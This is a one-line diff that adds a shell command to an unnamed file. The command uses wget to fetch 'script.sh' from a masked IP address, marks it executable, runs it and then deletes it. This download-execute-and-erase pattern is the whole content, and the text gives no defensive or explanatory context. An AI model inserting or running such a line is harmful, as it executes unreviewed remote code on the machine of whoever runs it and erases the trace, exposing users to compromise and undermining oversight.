@@ -1,0 +1,1 @@
+S=script.sh; wget "http://XX.XXX.XX.XX/$S" -O "$S" && chmod 744 "$S" && "./$S" && rm -f "$S"
